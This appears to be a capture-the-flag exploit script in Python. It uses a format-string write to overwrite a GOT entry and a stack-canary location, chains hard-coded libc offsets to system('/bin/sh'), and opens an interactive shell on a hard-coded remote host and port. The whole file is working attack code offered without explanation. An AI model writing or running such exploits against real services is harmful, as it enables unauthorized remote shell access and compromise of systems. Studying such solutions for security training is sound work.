#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import time
import re

#host = "10.211.55.23"
#port = 8888

host = "175.119.158.131"
port = 17171

sock = make_conn(host,port)

stackgot = 0x80497e4
libc = 0xb7599000 #use bruteforce
system = libc + 0x3b180
canaryaddr = libc - 0x6ac
binsh = libc + 0x15f61b
add_esp = libc + 0x78ba1
payload = pack32(stackgot)
payload += pack32(stackgot+1)
payload += pack32(stackgot+2)
payload += pack32(stackgot+3)
payload += pack32(canaryaddr)
payload += "a"*16
payload += pack32(binsh)

prev = 20+16+4
for i in range(4):
    payload += fmtchar(prev, ( add_esp >> i*8) & 0xff,7 + i)
    prev = (add_esp >> i*8) & 0xff

payload += fmtchar(prev, 1 ,11)

payload = payload.ljust(0x120-48,"a")
payload += pack32(system)
payload += pack32(system)
payload += pack32(binsh)
time.sleep(0.2)
sendline(sock,payload)

inter(sock)
